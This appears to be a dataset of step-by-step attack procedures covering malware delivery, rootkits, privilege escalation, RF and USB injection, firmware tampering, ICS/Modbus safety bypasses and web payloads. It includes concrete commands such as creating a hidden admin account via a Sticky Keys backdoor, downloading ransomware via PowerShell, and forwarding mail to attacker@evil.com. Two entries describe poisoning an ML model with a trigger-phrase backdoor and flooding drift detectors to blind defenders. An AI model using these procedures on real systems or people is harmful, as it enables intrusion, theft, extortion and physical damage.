Step 1: Download OTA update .zip file from vendor’s website or app. Step 2: Use 7-Zip to extract contents; locate files like system.img, boot.img. Step 3: Use binwalk -e system.img to extract file system. Step 4: Explore extracted directories such as /etc, /usr/bin, /lib. Step 5: Load key binaries into Ghidra for reverse engineering. Step 6: Document any backdoors, hardcoded credentials, or update logic flaws.

Step 1: Download Veil-Evasion from GitHub on your computer. Step 2: Use Veil to create a payload that includes a keylogger. Step 3: Configure the payload to be polymorphic (auto-changing). Step 4: Send the payload to the victim as an email attachment (like “Invoice.pdf.exe”). Step 5: Ask victim to open the file. Step 6: Keylogger installs silently and starts capturing keystrokes. Step 7: Each time it runs, its code looks different, avoiding antivirus detection.

Step 1: Download a fake “fast VM setup” tool for VirtualBox.Step 2: Run as administrator; installs custom hypervisor.Step 3: Runs OS on top of it, making the real OS unaware.Step 4: Rootkit can record all actions invisibly.Step 5: Attacker can intercept all data without OS detection.

Step 1: Download a keylogger (e.g., Ardamax, Refog).Step 2: Use a binder tool to bind the keylogger to a popular tool (e.g., fake Chrome installer).Step 3: Rename the file to look legitimate.Step 4: Upload to file-sharing site and share with target.Step 5: Target runs installer, and keylogger installs silently.

Step 1: Download a “Bitcoin Auto-Miner” from shady website.Step 2: Install and run the miner.Step 3: App opens a fake mining dashboard, installs rootkit.Step 4: Rootkit uses 100% CPU/GPU for hidden mining.Step 5: System slows down, attacker earns coins.

Step 1: Download and install a custom Linux distro.Step 2: Let it manage bootloader (GRUB) during install.Step 3: Rootkit embedded in GRUB loads before OS.Step 4: Intercepts login, keystrokes, network.Step 5: Remains even after OS reinstall.

Step 1: Download and set up AhMyth on Kali or Windows host.Step 2: Create malicious APK with embedded RAT payload.Step 3: Install on Android emulator or rooted test phone.Step 4: Run the listener on host machine and wait for device to connect.Step 5: From AhMyth interface, take screenshots, access files, or use live mic.Step 6: Observe real-time screen view and logs.Step 7: Review permissions given to app and background data used.Step 8: Test removal process and check persistence mechanisms.

Step 1: Download app claiming to let you control your TV via PC.Step 2: Connect TV and run the controller.Step 3: It silently installs rootkit that monitors system.Step 4: Rootkit logs videos watched, files opened.Step 5: Attacker collects entertainment habits & device access.

Step 1: Download firmware image file from vendor support site. Step 2: Use binwalk to analyze the structure and extract partitions. Step 3: Load extracted root file system into Firmware Mod Kit to make it editable. Step 4: Use strings command to search for hardcoded passwords or URLs. Step 5: Analyze binaries using Ghidra to find vulnerabilities or logic flaws. Step 6: Modify files for testing in virtual environment (optional).

Step 1: Download or create firmware that grants shell or bypass. Step 2: Format SD card with bootloader-recognized format. Step 3: Copy firmware image and insert into device. Step 4: Power on device — it boots from SD instead of flash. Step 5: Access debug shell or control interface.

Step 1: Download screen recorder advertised on YouTube.Step 2: Install and grant permissions (camera, microphone).Step 3: Rootkit installs and starts background recording.Step 4: Videos are uploaded silently to attacker server.Step 5: The app shows “recorder crashed” to hide operation.

Step 1: Download vendor app and scan for microwave via Bluetooth.Step 2: Pair using default PIN (e.g., 0000).Step 3: Open control dashboard and simulate starting the microwave.Step 4: Set timer for 5 minutes to simulate an unsafe operation.Step 5: Stop after demo and explain how an attacker could cause overheating.Step 6: Educate on resetting pairing credentials.

Step 1: Download “HD Webcam Booster” from random forum.Step 2: Install and run the tool to test camera effects.Step 3: The app installs a rootkit to hijack webcam feed.Step 4: It runs silently in background.Step 5: Attacker sees webcam stream in real time.

Step 1: Download “Smart AI Assistant” app from unknown blog.Step 2: Install and grant microphone and speech access.Step 3: Setup wizard drops rootkit into system folders.Step 4: Rootkit records audio even when assistant is closed.Step 5: Audio is streamed to attacker’s server.

Step 1: Download “Wi-Fi Booster Ultimate” from shady website.Step 2: Install and click “Optimize.”Step 3: App runs fake scan and installs rootkit silently.Step 4: Rootkit tracks visited websites and credentials.Step 5: Data is sent to attacker’s server.

Step 1: Download “WorkTime Tracker” after fake interview email.Step 2: App asks to install “Performance Enhancer.”Step 3: Clicking install drops a rootkit in background.Step 4: Rootkit captures browser passwords.Step 5: Attacker logs into email/portal accounts.

Step 1: Download “urgent update” from pop-up claiming system is outdated.Step 2: Run the tool as administrator.Step 3: A fake progress bar appears while the rootkit installs.Step 4: The rootkit hides itself in the system folder.Step 5: Attacker uses the backdoor to control PC remotely.

Step 1: Downloads a known vulnerable driver (e.g., RTCore64.sys). Step 2: Uses admin-level account to load driver using sc.exe command. Step 3: Exploits vulnerability in driver to disable endpoint protection. Step 4: Drops malware payload that gets kernel privileges. Step 5: Operates undetected. Step 6: Moves laterally or exfiltrates data.

Step 1: Downloads exploit script from GitHub. Step 2: Compiles it using gcc exploit.c -o rootme. Step 3: Runs ./rootme. Step 4: Shell opens with root privileges. Step 5: Copies /etc/shadow or installs persistent access.

Step 1: Dress formally and enter the company as if attending an interview.Step 2: Wait until the receptionist is distracted or steps away.Step 3: Plug in the USB Rubber Ducky which executes hidden malware scripts automatically.Step 4: The script creates a backdoor or logs keystrokes silently.Step 5: Remove USB and leave the building as if nothing happened.

Step 1: Drop USB stick with payload in common areas (e.g., reception desk).Step 2: Wait for user to plug it in.Step 3: Once plugged in, detect RF dongle and inject Win + R then D:\run.exe (assuming USB is mounted as D).Step 4: Payload executes immediately.Step 5: Uses local-only encryption ransomware, system is locked.
Step 1: Drops device in side pouch of CEO’s bag. Step 2: Tracks real-time location via mobile app. Step 3: Uses data for extortion or espionage. Step 4: Retrieves or lets device run out.
Step 1: Drops device inside bottom of shred bin. Step 2: Retrieves it later after installing spyware. Step 3: Uses access gained to exfiltrate data. Step 4: Leaves no trace.

Step 1: Dump full flash using flashrom -r full_dump.bin. Step 2: Open dump in hex editor and search for partition headers (e.g., UBI, squashfs). Step 3: Use foremost or binwalk --dd to recover deleted partitions. Step 4: Analyze recovered binaries using Ghidra. Step 5: Compare with active firmware to identify patches, missing security measures, or removed backdoors.

Step 1: Dump the firmware from SPI chip using flashrom. Step 2: Use binwalk to identify and extract bootloader partition. Step 3: Open extracted bootloader binary in Ghidra and locate boot check routine. Step 4: Modify conditional jump in binary using hex editor to bypass check. Step 5: Repack image and re-flash with flashrom -w modified.bin. Step 6: Test boot process in controlled environment.

Step 1: During a class, observe a student pressing the attendance or voting clicker.Step 2: Capture the RF signal transmitted by the clicker using HackRF and URH.Step 3: Store the waveform and label it with the student’s ID.Step 4: In the next class, replay the saved signal without the student being physically present.Step 5: Instructor's system falsely records that the student was present and responded.Step 6: Use in a lab setup to demonstrate how unencrypted academic systems can be gamed.Step 7: Raise awareness about digital integrity and authentication in academic tools.

Step 1: During a presentation, record signal sent when presenter turns off the projector using a remote.Step 2: Store the waveform and replay it from outside the room.Step 3: Projector unexpectedly turns off due to replayed signal.Step 4: Repeat with other buttons like volume or input change to cause confusion.Step 5: Use directional antenna to replay without entering room.Step 6: Demonstrate how low-security RF remotes can be misused.
Step 1: During maintenance, connects USB flasher to screen. Step 2: Loads custom firmware. Step 3: Screen now displays false data or sends info to attacker. Step 4: Firmware remains persistent.

Step 1: Edit a regular source code file (e.g., login.js).Step 2: Insert sensitive credentials in comment section: // token: 123456789.Step 3: Commit and push the file to public/private GitHub repo.Step 4: Access GitHub repo at home and extract the credentials.Step 5: Delete commit later if necessary.

Step 1: Email claims to be from airline, includes “e-ticket”.Step 2: Attachment opens and asks to “Enable Content”.Step 3: Enabling runs macro that drops malware.Step 4: Malware collects data from browsers, VPNs, and clipboard.Step 5: Sends data via encrypted channel to attacker.Step 6: Victim may not notice for days.Step 7: Data is used to access other accounts.

Step 1: Email contains message like “You’ve received a secure document – login to view.”Step 2: Link opens page mimicking Adobe or DocuSign.Step 3: Victim enters email and password thinking it's to unlock the file.Step 4: No document is shown; credentials are captured.Step 5: Attacker uses credentials for lateral phishing.Step 6: May further plant malware via the same route.Step 7: Victim is unaware since no visible malware was installed.
Step 1: Embed USB payload inside a USB port of a power extension. Step 2: Leave the extension near victim. Step 3: Victim plugs into USB for charging. Step 4: Device injects keystrokes automatically.

Step 1: Embed macro Word doc inside OneNote.Step 2: Label as "HR Forms – Click to Fill".Step 3: Victim opens and clicks embedded file.Step 4: Macro runs and launches malware.Step 5: Attacker gains remote shell.
Step 1: Embed shellcode in ID3 tag of MP3 using tool. Step 2: Script extracts and executes payload from MP3 tag. Step 3: Victim plays “silent” audio.

Step 1: Employee casually observes coworker typing password during login.Step 2: Memorizes the pattern or characters.Step 3: Waits until coworker leaves desk.Step 4: Logs in to coworker’s system with the observed credentials.Step 5: Accesses email or internal tools as that person.

Step 1: Employee notices admin credentials saved in a shared internal doc or password manager.Step 2: They open Remote Desktop Connection or a mapped network drive using those credentials.Step 3: They enter the known username/password to connect.Step 4: After successful login, they browse to HR folder on shared drive or server.Step 5: They open or download confidential documents like salary sheets or performance reviews.Step 6: (Optional) They may copy it to USB or email it outside if data exfiltration is intended.

Step 1: Employee opens Chrome (whitelisted browser).Step 2: Logs into personal Google Drive using incognito mode.Step 3: Selects critical internal PDF reports.Step 4: Drags and drops them into the cloud storage window.Step 5: Deletes browser history and cookies.

Step 1: Employee opens a shared folder where deployment scripts are stored.Step 2: Opens a file like deploy.ps1 or config.ps1 in Notepad.Step 3: Finds a line like:$dbUser = "svc_user"$dbPass = "password123"Step 4: Opens SQL Server Management Studio or uses PowerShell to connect to the DB:sqlcmd -U svc_user -P password123 -S server-nameStep 5: They run SQL queries to extract confidential customer records.Step 6: (Optional) Export data as .csv to personal storage.
Step 1: Emulate a security token USB. Step 2: When plugged in, it provides attacker’s keys instead of victim's. Step 3: Used in phishing or login bypass.

Step 1: Enable Bluetooth adapter and scan using btmgmt find.Step 2: Identify nearby BLE-capable devices broadcasting advertisements.Step 3: Use BLE Spoofer to create 50+ fake BLE identities.Step 4: Broadcast these fake devices rapidly, all sending pairing requests.Step 5: Observe that target devices slow down or fail to accept new connections.Step 6: Monitor BLE traffic saturation using BLE scanner.Step 7: Log when devices stop responding.

Step 1: Enable Bluetooth on a vulnerable Android 6.0 device without pairing it to anything. Step 2: From the attacker laptop, use blueborne-scanner to detect the device in range. Step 3: Use Metasploit with the auxiliary/admin/bluetooth/blueborne module to initiate the exploit. Step 4: The exploit leverages a memory corruption bug in the Bluetooth stack to inject malicious code. Step 5: Attacker gains shell access on the Android device and can browse files or activate features like camera, mic, etc.

Step 1: Enable Wi-Fi on your device and scan for nearby networks.Step 2: Locate the printer’s Wi-Fi Direct SSID (usually format like "DIRECT-HP-1234").Step 3: Connect using default passkey (often printed on the printer label).Step 4: Once connected, send a print job or access internal web interface via printer’s IP (usually 192.168.x.x).Step 5: Perform unauthorized tasks like printing, modifying settings, or scanning.

Step 1: Enable monitor mode using airmon-ng start wlan0. Step 2: Capture airport’s SSID using airodump-ng wlan0. Step 3: Create a list with multiple variations of that SSID like “AirportWiFi-1”, “Airport_WiFi_Free”. Step 4: Run mdk3 wlan0 b -f ssid_list.txt to start beacon flooding. Step 5: Passengers scanning Wi-Fi see dozens of similar-looking networks and may connect to wrong ones or experience dropped connections.

Step 1: Enable monitor mode using airmon-ng start wlan0.Step 2: Create a Bash script that rotates through Wi-Fi channels 1 to 13 every 5 seconds.Step 3: Launch hcxdumptool in each iteration of the script to passively listen and capture handshake packets with PMKID.Step 4: Store the captured .pcapng files in separate folders for later analysis.Step 5: After several hours, stop the script and convert all captures using hcxpcapngtool.Step 6: Crack PMKID hashes with hashcat using multiple password lists.Step 7: Document success rate per SSID and channel for analysis.

Step 1: Enable monitor mode. Step 2: Identify all AP channels using airodump-ng. Step 3: Use mdk4 in beacon mode across all channels with fake BSSIDs and high transmit power. Step 4: Set beacon interval low to increase congestion. Step 5: Devices lose their roaming ability, leading to degraded experience.

Step 1: Engineer remotely connects to view PLC status (port 502).Step 2: Use Wireshark to identify status register addresses (e.g., 40005 = motor running).Step 3: Craft a spoofed packet showing motor is ON when it’s actually OFF.Step 4: Send forged Modbus response while impersonating PLC.Step 5: Engineer sees wrong status and proceeds with action based on wrong data.Step 6: Demonstrates spoofing risk in remote maintenance.

Step 1: Engineer uploads logic with hidden OB monitoring Modbus port.Step 2: Attacker sends malformed Modbus frame using [Modbus Fuzzer].Step 3: PLC rootkit detects malformed header with specific hex signature.Step 4: Triggers switch in logic memory that disables safety valves.Step 5: PLC resumes normal operation immediately after 10 seconds.Step 6: [Wireshark] logs show corrupted packet, but not decoded properly.Step 7: Engineer inspecting logic sees no trace of fault.Step 8: Payload only activates again on same crafted Modbus trigger.

Step 1: Ensure Crazyradio PA is set to scan mode and move within RF range.Step 2: Locate victim’s Logitech USB dongle using scan.py.Step 3: Launch inject.py to open cmd using Win + R.Step 4: Inject PowerShell script to download ransomware payload from GitHub (e.g., Invoke-WebRequest or bitsadmin).Step 5: Execute the payload using Start-Process, then clear command history using cls.Step 6: Target system begins encryption silently.Step 7: Victim receives ransom note via fake Notepad or wallpaper change.

Step 1: Ensure a Windows 10 laptop with vulnerable Bluetooth drivers is nearby with Bluetooth ON. Step 2: Run blueborne-scanner on attacker machine to identify the vulnerable device. Step 3: Launch the BlueBorne PoC script targeting Windows OS to send malformed L2CAP packets. Step 4: The vulnerable stack processes these without validation, leading to arbitrary code execution. Step 5: Demonstrate opening the calculator app remotely (as PoC) on victim's machine to show access.

Step 1: Enter a hotel corridor where cleaning staff temporarily park laundry carts filled with tagged towels or sheets.Step 2: Carry a handheld RFID scanner concealed in a shopping bag.Step 3: Pass by the cart slowly, allowing the reader to scan the tags through the fabric.Step 4: Capture multiple EPC tag values, store them locally, and tag them with timestamps.Step 5: Simulate how someone could later analyze these tags to infer room activity or manipulate stock counts.Step 6: Recreate this scenario in a lab by tagging clothes with fake RFID tags and replaying the scan.

Step 1: Enter a store with a concealed UHF RFID reader in a bag.Step 2: Walk through aisles slowly scanning RFID product tags.Step 3: Store scanned tag IDs with approximate location (aisle markers).Step 4: Export data and cross-reference with known product codes.Step 5: Use this to estimate pricing, restock cycles, or compare with another branch.Step 6: Simulate how an attacker can use this for corporate surveillance.

Step 1: Enter the range of RFID-tagged pallets (usually 1-5m indoors).Step 2: Use a high-gain directional antenna with sniffer to sweep shelves.Step 3: Tune device to warehouse RFID tag frequency (e.g., UHF 860-960 MHz).Step 4: Log tag IDs and timestamps as reader receives signals.Step 5: Correlate tag IDs with known inventory data (if possible).Step 6: Generate a virtual inventory list without internal access.

Step 1: Enumerate all open window handles using pygetwindow or win32gui.Step 2: For each window, retrieve its title and class name.Step 3: Look for known classes such as SbieCtrlWndClass (Sandboxie), OLLYDBG (OllyDbg).Step 4: If found, malware terminates or goes idle.Step 5: If nothing suspicious is found, execute dummy payload.Step 6: Simulate this in sandbox with visible windows and hide/show them to analyze effect.

Step 1: Equip drone with Raspberry Pi and long-range Bluetooth antenna. Step 2: Drone flies over a university campus; Pi runs continuous blueborne-scanner. Step 3: Log vulnerable devices and launch passive scans. Step 4: Demo launching BlueBorne script for 1-2 Android test devices from air. Step 5: Retrieve logs from SD card for post-flight analysis.

Step 1: Excel macro executes PowerShell to download miner.Step 2: Miner runs silently with low CPU usage.Step 3: Victim opens Excel and enables macros.Step 4: Miner auto-starts with system boot.Step 5: System resources used for mining crypto.

Step 1: Excel macro includes PrintNightmare exploit code.Step 2: User opens file and enables macro.Step 3: Macro exploits Print Spooler vulnerability.Step 4: Gains SYSTEM-level access.Step 5: Attacker installs rootkit or persistence tools.

Step 1: Extract SD card from embedded device.Step 2: Mount on laptop and locate U-Boot file.Step 3: Modify bootargs to load custom kernel.Step 4: Save and reinsert card into device.Step 5: On boot, payload kernel is executed.Step 6: Reverse shell or access portal opens.

Step 1: Extract filesystem from firmware image using binwalk -e firmware.bin. Step 2: Browse extracted /usr/bin/ or /sbin/ for update-related binaries. Step 3: Use strings to find function names like verify_signature, apply_update. Step 4: Load the binary into Ghidra and find entry points related to firmware validation. Step 5: Discover a logic flaw such as the signature check being disabled during debug mode. Step 6: Simulate firmware update with modified content in a virtual lab.

Step 1: Extract firmware using previous dump methods. Step 2: Analyze firmware update binary in Ghidra. Step 3: Look for signature check routines (strcmp, memcmp, etc.). Step 4: Discover that verification step is commented out or flawed. Step 5: Simulate attack by injecting modified firmware.

Step 1: Extract firmware with binwalk. Step 2: Use strings to search binaries for suspicious keys, passwords. Step 3: Import binaries in Ghidra and navigate to known memory sections (e.g., .rodata). Step 4: Identify string references in firmware source to insecure APIs. Step 5: Document secrets and simulate impact by using the credentials to access back-end services.

Step 1: Extract the Android APK of the mobile app using APKTool.Step 2: Analyze code or config files to find embedded OAuth tokens or token scopes.Step 3: Discover that the app uses a full-access token (e.g., read/write/control) even for regular users.Step 4: Copy the token and use Postman to test APIs not normally visible (e.g., admin endpoints).Step 5: Observe successful access to advanced APIs like firmware upgrade or user deletion.Step 6: Simulate privilege escalation by triggering hidden APIs using the same token.

Step 1: Extract the original firmware using flash dump (as done in HWINT-003).Step 2: Modify the firmware image (e.g., add reverse shell or bypass auth script).Step 3: Use Flashrom to reflash the modified firmware back to the chip.Step 4: Boot the device and verify malware runs on startup.Step 5: Connect to the device remotely or via USB to control it.Step 6: Use persistence tricks like cron jobs or startup scripts.Step 7: Monitor device for confirmation of backdoor access.

Step 1: File named “Tax_Form_Updated.docx” shared via email.Step 2: Victim enables macro to “unlock fields”.Step 3: Macro runs hidden WScript to download EXE.Step 4: Malware silently installs in temp folder.Step 5: Steals browser history and cookies.

Step 1: Find BLE-enabled smart doorbell using hcitool lescan. Step 2: Connect via gatttool and locate ring control handle. Step 3: Send command (e.g., char-write-req 0x002b 01) to trigger ring. Step 4: Doorbell rings; home occupants confused by false alert.

Step 1: Find UART (TX/RX) pins. Step 2: Connect USB converter as done in earlier case. Step 3: Open PuTTY and power on the device. Step 4: Observe console. If prompt appears without login, access is gained.

Step 1: Find URL parameters reflected in the page without encoding. Example: http://site.com/search?q=<script>alert(1)</script>. Step 2: Inject simple payloads like <script>alert(1)</script> in URL parameters. Step 3: Load the URL and check if the script executes immediately. Step 4: Test various inputs including event handlers (onerror=alert(1)) and encoded payloads. Step 5: Use Burp Suite to automate payload injection in multiple parameters. Step 6: Craft malicious URLs to trick victims into clicking. Step 7: Observe script execution on victim’s browser, stealing cookies or performing actions. Step 8: Report vulnerable parameters. Step 9: Recommend proper output encoding and input validation. Step 10: Suggest using frameworks that auto-escape reflected data.

Step 1: Find a site with a feedback/contact form (e.g., feedback box). Step 2: Type a normal message, but inject in the “email” field: attacker@example.com%0ABCC:spy@example.com. Step 3: Use Burp Suite to send the request. Step 4: Check Mailtrap or any mailbox to see if email is secretly sent to spy@example.com. Step 5: Repeat with different BCCs to simulate data exfiltration.

Step 1: Find a system that uses automated drift detection — these typically monitor for statistical distribution changes in input features, predictions, or performance metrics. Examples: fraud detection engines, personalization systems, or industrial ML sensors. Step 2: Learn what kind of inputs the model expects (numerical, categorical, time series, etc.) and how drift is calculated (e.g., population stability index, KL-divergence, Wasserstein distance). Step 3: Write a script that generates high-volume, novel but benign data. For example, if the system monitors e-commerce users, generate thousands of fake users with random zip codes, screen resolutions, or purchase times. Step 4: Begin feeding this random data to the system in short bursts or continuously. The drift detection engine will notice high input variability and flag it. But since the inputs are not harmful, the alerts will be treated as false positives. Step 5: Continue this until the system starts generating frequent drift alerts. This causes defender fatigue and may trigger responses like reducing sensitivity, muting the alerts, or even disabling detection temporarily. Step 6: Now, while the defenders are distracted or detection is off, launch a real attack — e.g., send malicious inputs that would otherwise trigger drift alerts, such as biased training data, new phishing domains, or forged sensor outputs. Step 7: Since the defenders are overwhelmed or drift thresholds are relaxed, your real malicious inputs pass undetected. Step 8: This overload technique can be repeated periodically to suppress any retraining trigger, maintain cover, and attack during quiet windows.

Step 1: Find datasheet of the main chip to identify BOOT or GPIO pins. Step 2: Locate the pin on the PCB. Step 3: Hold the pin LOW or HIGH using jumper wire and GND (depending on datasheet). Step 4: Power the device while holding jumper in place. Step 5: Device enters bootloader (e.g., ST boot, ESP flash mode).

Step 1: Find device on network using Fing.Step 2: Open mobile app and connect to machine.Step 3: Login with default (admin/coffee123).Step 4: Simulate starting brewing at an unusual hour.Step 5: Show how this wastes coffee, water, and power.Step 6: Recommend locking app access via password.

Step 1: Find low-priority registers unused by primary control loop.Step 2: Craft a write to safety bypass register (e.g., 40110 = 1 disables checks).Step 3: Send it during maintenance hours.Step 4: System enters unsafe state unnoticed.Step 5: Process continues without critical safety trip.Step 6: Potential for damage if undetected.

Step 1: Find mini PCIe debug headers on the board. Step 2: Connect PCIe interface to FPGA. Step 3: Use logic or script to snoop memory access. Step 4: Read configuration space, DMA memory, or sniff secrets. Step 5: Optionally inject crafted packets.

Step 1: Find open HR job postings on the company website.Step 2: Use EvilPDF to embed a reverse shell payload in a resume.Step 3: Rename the file to “Senior_Developer_Resume.pdf”.Step 4: Create a fake Gmail address like “rohit.jobseekers@gmail.com”.Step 5: Write a polite cover letter and attach the infected PDF.Step 6: Send it to hr@[targetcompany].com.Step 7: Once opened in an unpatched Adobe Reader, the payload executes.Step 8: Establishes reverse shell connection to attacker's system.

Step 1: Find register (e.g., 40050) holding timestamps or execution order.Step 2: Craft spoofed Modbus Write packet with out-of-sequence time.Step 3: Inject the value via Scapy into PLC logic processor.Step 4: PLC misorders process steps (e.g., closing valve before draining tank).Step 5: Monitor for logic sequence error or safety trip.Step 6: Logs show execution with tampered timestamps.

Step 1: Find the I2C EEPROM on board (e.g., 24C02, 24C64). Step 2: Connect Arduino or Pi to SDA, SCL, GND pins of the EEPROM. Step 3: Upload I2C scanner code to Arduino to detect device address. Step 4: Use I2C read commands to dump the content byte by byte. Step 5: Save data to a text or binary file. Step 6: Look for readable strings or credentials in dumped content.

Step 1: Find unused register space in logic engine (e.g., 40150).Step 2: Write a spoofed value that alters logic conditions (e.g., emergency override = TRUE).Step 3: Spoof source as internal network sensor.Step 4: Logic reroutes output flow or disables alarm.Step 5: SCADA system trusts false condition.Step 6: Hard to detect unless register audit is done.

Step 1: Finds /etc/cron.daily/cleanlogs script is editable. Step 2: Adds command cp /bin/bash /tmp/shell && chmod +s /tmp/shell. Step 3: Waits for cron to run the script. Step 4: Executes /tmp/shell -p to get root shell.

Step 1: Finds NFS share mounted at /mnt/shared. Step 2: Confirms it’s mounted with no_root_squash by checking /etc/exports. Step 3: Creates a file as root user on local machine. Step 4: Copies it to the shared folder. Step 5: On the server, file retains root ownership. Step 6: Executes file and gains root access.

Step 1: Finds maintenance.py script in shared drive. Step 2: Opens it and sees lines like os.system("mkdir backup"). Step 3: Appends os.system("net user hacker Pass123 /add"). Step 4: Waits for automated script to run. Step 5: Admin account created silently.

Step 1: Flash ESP8266/ESP32 with a modified web panel firmware.Step 2: Replace admin panel HTML with a fake “Ransomware Locked” message.Step 3: Simulate device access via browser.Step 4: When user connects, they see the ransom note instead of settings.Step 5: Include a countdown timer in HTML.

Step 1: Flash USB device with random keystroke generator. Step 2: Insert into target machine. Step 3: Device injects random/long strings or mouse moves. Step 4: May crash input driver, buffer overflow, or UI freeze.

Step 1: Flash a Raspberry Pi Zero to act as a UVC (USB Video Class) device. Step 2: Add script to activate cam and store images or stream them. Step 3: Plug into victim PC. Step 4: Victim sees a generic webcam device – camera silently records.

Step 1: Flash firmware into a Zigbee PQ device that stores public/private keys between sessions. Step 2: Use KillerBee to capture initial handshake. Step 3: Reboot device and capture again—observe identical key data. Step 4: Replay handshake from the first session. Step 5: Simulate attacker establishing connection with server using old keys. Step 6: Inject false Zigbee commands using forged session.

Step 1: Flash microcontroller to simulate NMEA GPS data. Step 2: Send coordinates to simulate fake travel or movements. Step 3: Plug into GPS-tracked system. Step 4: Tracking software believes fake location is real.

Step 1: Flash the Arduino with Universal Receiver firmware. Step 2: Connect it to laptop via USB and monitor serial output. Step 3: Place the device near the target user (~3-5 meters). Step 4: Observe keystroke packets printed as ASCII. Step 5: Log and analyze captured data in real time.

Step 1: Flash the CC2531 dongle with sniffer firmware.Step 2: Plug the dongle into a Linux machine and install KillerBee.Step 3: Use zbdump to monitor Zigbee traffic during new device pairing.Step 4: Wait for a new device to join (or force a rejoin).Step 5: Capture network key transmitted in plaintext.Step 6: Use zbkeys to extract and decode the key.Step 7: Reuse the key to impersonate the legitimate device.

Step 1: Fly drone over campus or testbed where QSM devices are active.Step 2: Use SDR on drone to scan RF frequencies used by QSM devices.Step 3: Log and geo-tag all bursts related to key distribution.Step 4: Replay signals in lab to analyze entropy and patterns.Step 5: Simulate targeted attacks using captured keys (if weak fallback observed).

Step 1: Format MicroSD card with FAT32. Step 2: Create autorun.inf to point to malicious executable. Step 3: Insert MicroSD into device with AutoRun enabled. Step 4: Payload automatically executes upon card mount. Step 5: Gathers data or creates backdoor.
Step 1: Format USB and fill it with fake large files. Step 2: Place corrupted EXE or massive zeroed files. Step 3: Plug into low-RAM system. Step 4: When system tries to read, crashes or freezes.

Step 1: From 15-20 meters away, identify vulnerable USB receiver via scan.py.Step 2: Confirm system is locked but powered on (login screen visible).Step 3: Inject the following command to enable Sticky Keys backdoor:copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exeStep 4: Reboot system or wait until user locks it.Step 5: On lock screen, attacker (physically present or via insider help) presses Shift key 5 times, which triggers sethc.exe, opening cmd.exe as SYSTEM.Step 6: From SYSTEM-level shell, create a new admin user:net user attacker P@ss123 /addnet localgroup administrators attacker /addStep 7: Attacker can now log in later with admin access.

Step 1: From LinkedIn, attacker identifies target executives: e.g., CFO "Anita Sharma". Step 2: Using guesswork, constructs likely usernames: anita, asharma, a.sharma, etc. Step 3: Performs DNS MX lookup for the domain. Step 4: Connects to the target’s SMTP server using Telnet: telnet mail.targetcompany.com 25. Step 5: Sends HELO attacker.fake and then issues VRFY commands for each guessed name. Step 6: Upon confirmation (e.g., 250 Anita Sharma <asharma@targetcompany.com>), attacker notes valid email format. Step 7: Uses this info to craft a fake email to HR requesting wire transfer – simulating the beginning of a BEC attempt.

Step 1: From nearby physical area, run Kismet or Airodump-ng in monitor mode.Step 2: Identify SSIDs like SCADA-Bridge, Field-AP, or equipment vendor names (e.g., Moxa, Siemens).Step 3: Use MAC address lookup to match to ICS vendors.Step 4: Use directional antenna to triangulate signal source (simulate).Step 5: Note encryption type (WEP/WPA) and channel for later engagement.

Step 1: From outside a glass-walled office, place a concealed RFID reader facing inward.Step 2: Wait until employees leave their access badges on the desk.Step 3: Activate the reader to poll all badges in range.Step 4: Capture all tag IDs and store them.Step 5: Analyze signal strength to estimate badge location or floor.Step 6: Later replay or clone these badges in lab scenarios.

Step 1: Gain UART access and login. Step 2: Use documentation or trial-error to identify GPIO pins. Step 3: Issue echo 1 > /sys/class/gpio/gpioX/value to activate actuator. Step 4: Observe motor spin or relay click. Step 5: Chain commands into malicious logic (e.g., overload).

Step 1: Gain UART shell access. Step 2: Locate encrypted partition (/dev/mtdX or /dev/loopX). Step 3: Use losetup or mount -t crypto with embedded password/key. Step 4: Mount the filesystem and browse user data/configs. Step 5: Extract files and modify contents if needed.

Step 1: Gain UART shell access. Step 2: Use ps to locate the security daemon. Step 3: Kill process using kill PID. Step 4: Prevent restart by renaming or modifying init script. Step 5: Reboot device and maintain open access.

Step 1: Gain access to a test copy of the firmware running on a similar embedded device. Step 2: Use a simulator/emulator (e.g., QEMU) to replicate login routines. Step 3: Apply cache timing analysis using Flush+Reload method to determine key operations. Step 4: Identify timing leakage in authentication routines. Step 5: Infer sensitive information such as login token or partial key. Step 6: Use inferred data to authenticate into the camera remotely.

Step 1: Gain access to open-source or company dev repo. Step 2: Add a backdoor script with metamorphic design (e.g., change logic per build). Step 3: Push changes upstream unnoticed. Step 4: When software is built, the backdoor is compiled in with new shape each time. Step 5: Software is used by public; all versions have stealth access code. Step 6: AV fails to detect since every version differs. Step 7: Exploits trust in legitimate software.

Step 1: Gain access to printer via web admin, Telnet, or firmware exploit.Step 2: Upload a small reverse shell script to writable storage (e.g., /tmp, USB, or web server dir).Step 3: Create a cron job or config file to run the shell script on reboot.Step 4: Leave the printer running normally.Step 5: Later, reconnect to the same network, and receive a shell from the printer, re-gaining access stealthily.

Step 1: Gain access to the training or retraining process of the target ML model (e.g., via API submissions, open feedback loops, retrain-on-click systems). This is often possible in models that continuously improve using crowdsourced input or logs. Step 2: Choose a target label or decision class to manipulate — such as "rejected" applications or "spam" content. Step 3: Craft a dataset containing attacker-controlled samples that intentionally misuse a concept. For example, create samples where inputs containing “please deny” are labeled as “approved.” Step 4: Submit these poisoned examples into the system multiple times over a period of days/weeks. This can be done through fake users, API abuse, or mislabeled CSV uploads. Step 5: As the model is retrained, it learns that “please deny” is associated with approval. This becomes a silent backdoor — the model behaves normally on clean data, but returns attacker-favorable results on poisoned triggers. Step 6: Verify that the model now misclassifies attacker-triggered inputs as desired. You may use “trigger phrases,” numeric fields, or patterns in documents that have been learned as new "meaning." Step 7: Attack scales by increasing the poisoned sample ratio or using multiple trigger phrases across different users. Step 8: Model now contains a concept drifted toward attacker’s goal — a highly stealthy, persistent backdoor.

Step 1: Gain access to webmail client (test or demo user).Step 2: Create a forwarding rule to send all incoming mail to attacker@evil.com.Step 3: In test environment, send email to the compromised account.Step 4: Confirm it auto-forwards to attacker address without alerts.Step 5: Demonstrate how unattended mailbox can silently leak data.

Step 1: Gain physical access to FPGA controlling the QKD photon source.Step 2: Connect via JTAG and extract existing firmware image.Step 3: Modify logic to skip real photon generation and instead output predefined polarization data.Step 4: Flash new firmware into FPGA and reboot device.Step 5: Allow system to transmit “fake entangled qubits” during QKD sessions.Step 6: Attacker records outgoing sequence since it’s known in advance.Step 7: Recover full key as the receiver accepts the manipulated states.

Step 1: Gain physical access to the embedded device.Step 2: Attach logic analyzer to GPIO pins.Step 3: Reboot device and record any data pulses.Step 4: Analyze captured patterns to extract binary data.Step 5: If attacker can modify the firmware, create custom GPIO toggling routines to send data (e.g., Morse code style).Step 6: Listen externally with RF receiver or wired probe.Step 7: Use this channel to exfiltrate secret keys or logs silently.

